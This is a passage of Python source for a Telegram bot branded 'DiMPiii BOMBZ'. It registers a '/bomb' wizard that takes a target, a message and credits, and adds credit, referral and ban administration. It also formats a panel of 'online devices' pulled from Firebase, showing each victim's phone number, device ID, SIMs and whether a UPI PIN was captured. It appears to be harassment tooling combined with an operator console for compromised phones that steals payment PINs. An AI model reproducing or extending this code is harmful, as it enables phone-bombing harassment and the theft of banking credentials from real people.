    text = ("╭━━━━━━━━━━━━━━━━━━╮\n"
            f"   {T_BOLT} <b>{scp('ONLINE DEVICES')}</b> {T_BOLT}\n"
            "╰━━━━━━━━━━━━━━━━━━╯\n\n"
            f"{T_STATS} <b>{scp('Total Devices')}:</b> {len(all_devices)}\n"
            f"{T_LINK} <b>{scp('Firebases')}:</b> {checked}\n{LINE}\n\n")
    for d in all_devices:
        try:
            bv = int(str(d['battery']).replace('%', '')) if d['battery'] != 'N/A' else 0
        except:
            bv = 0
        bi = "🔋" if bv > 30 else "🪫"
        text += (f"{T_STAR} <b>{scp('FIREBASE')} :</b> <code>{html_escape(str(d['fb_name']))}</code>\n"
                 f"{T_PIN} <b>{scp('Device')}:</b> {html_escape(str(d['name']))}\n"
                 f"{T_BOOKMARK} <b>ID:</b> <code>{html_escape(str(d['id']))}</code>\n"
                 f"{T_MSG} <b>{scp('Number')}:</b> {html_escape(str(d['phone']))}\n"
                 f"{bi} <b>{scp('Battery')}:</b> {html_escape(str(d['battery']))} | {len(d['sims'])} SIM(s)\n"
                 f"{T_SHIELD} <b>UPI PIN:</b> {'✅' if d.get('upipin') else '❌'}\n{LINE_THIN}\n")
    if len(text) > 4000:
        chunks = [text[i:i+4000] for i in range(0, len(text), 4000)]
        try:
            await scan_msg.edit_text(chunks[0], parse_mode=ParseMode.HTML)
        except:
            pass
        for chunk in chunks[1:]:
            await update.message.reply_text(chunk, parse_mode=ParseMode.HTML)
    else:
        try:
            await scan_msg.edit_text(text, parse_mode=ParseMode.HTML)
        except:
            await update.message.reply_text(text, parse_mode=ParseMode.HTML)


async def manage_fb_msg(update):
    firebases = load_firebase_urls()
    text = ("╭━━━━━━━━━━━━━━━━━━╮\n"
            f"   {T_GEAR} <b>{scp('MANAGE FIREBASES')}</b> {T_GEAR}\n"
            "╰━━━━━━━━━━━━━━━━━━╯\n\n")
    if not firebases:
        text += f"{T_WARN} {scp('No Firebase saved.')}\n"
    else:
        for fb in firebases:
            text += f"{T_STAR} <b>{html_escape(fb['id'])}</b>: <code>{html_escape(fb['url'])}</code>\n"
    text += f"\n{T_MSG} {scp('Use /addfb or /deletefb')}"
    if len(text) > 4000:
        for i in range(0, len(text), 4000):
            await update.message.reply_text(text[i:i+4000], parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(text, parse_mode=ParseMode.HTML)


# ==================================================================
# MAIN
# ==================================================================
def build_application():
    return (Application.builder()
            .token(TOKEN)
            .concurrent_updates(True)
            .read_timeout(30).write_timeout(30).connect_timeout(30).pool_timeout(30)
            .get_updates_read_timeout(30).get_updates_write_timeout(30)
            .get_updates_connect_timeout(30).get_updates_pool_timeout(30)
            .build())


def register_handlers(app):
    conv = ConversationHandler(
        entry_points=[
            CommandHandler("bomb", bomb_wizard_start),
            MessageHandler(filters.Regex(f'^{re.escape(BTN_LAUNCH_BOMB)}$'), bomb_wizard_start),
        ],
        states={
            TARGET: [MessageHandler(filters.TEXT & ~filters.COMMAND, bomb_target)],
            MESSAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, bomb_message)],
            CREDITS: [MessageHandler(filters.TEXT & ~filters.COMMAND, bomb_credits)],
        },
        fallbacks=[
            CommandHandler("cancel", cancel_conversation),
            MessageHandler(filters.Regex(f'^{re.escape(BTN_CANCEL)}$'), cancel_conversation),
        ],
        allow_reentry=True,
    )
    app.add_handler(conv)
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, button_handler))

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("ping", ping))
    app.add_handler(CommandHandler("balance", balance_command))
    app.add_handler(CommandHandler("stats", show_stats_msg))
    app.add_handler(CommandHandler("redeem", redeem_command))
    app.add_handler(CommandHandler("addkey", addkey_command))
    app.add_handler(CommandHandler("addcredits", addcredits_command))
    app.add_handler(CommandHandler("remcredits", remcredits_command))
    app.add_handler(CommandHandler("setcredits", setcredits_command))
    app.add_handler(CommandHandler("addpoints", addpoints_command))
    app.add_handler(CommandHandler("rempoints", rempoints_command))
    app.add_handler(CommandHandler("setpoints", setpoints_command))
    app.add_handler(CommandHandler("ban", ban_command))
    app.add_handler(CommandHandler("unban", unban_command))
    app.add_handler(CommandHandler("history", history_command))
    app.add_handler(CommandHandler("addfb", add_firebase_command))
    app.add_handler(CommandHandler("deletefb", delete_firebase_command))
    app.add_handler(CommandHandler("broadcast", broadcast_command))
    app.add_handler(CommandHandler("referral", referral_command))
    app.add_handler(CommandHandler("buy", buy_points_command))

    app.add_handler(CallbackQueryHandler(callback_handler, pattern="^(check_join|buy_|confirm_|admin_)"))


def main():
    global BOT
    MAX_RETRIES = 5
    RETRY_DELAY = 5
    for attempt in range(1, MAX_RETRIES + 1):
        try:
            print(f"\n{'='*50}\n🚀 DiMPiii BOMBZ — attempt {attempt}/{MAX_RETRIES}\n{'='*50}\n")
            app = build_application()
            BOT = app.bot
            set_bot(BOT)
            register_handlers(app)
            logger.info(f"✅ Bot started (attempt {attempt})")
            print("✅ Bot started successfully!\n")
            app.run_polling(drop_pending_updates=True, poll_interval=1.0, timeout=30)
            return
        except KeyboardInterrupt:
            print("\n👋 Stopped by user."); sys.exit(0)
        except Exception as e:
            logger.error(f"❌ Attempt {attempt}/{MAX_RETRIES} failed: {e}")
            print(f"\n❌ Attempt {attempt}/{MAX_RETRIES} failed: {e}")
            if attempt < MAX_RETRIES:
                print(f"⏳ Retrying in {RETRY_DELAY}s...\n")
                time.sleep(RETRY_DELAY)
            else:
                print("\n❌ ALL RETRIES FAILED"); sys.exit(1)


if __name__ == "__main__":
    main()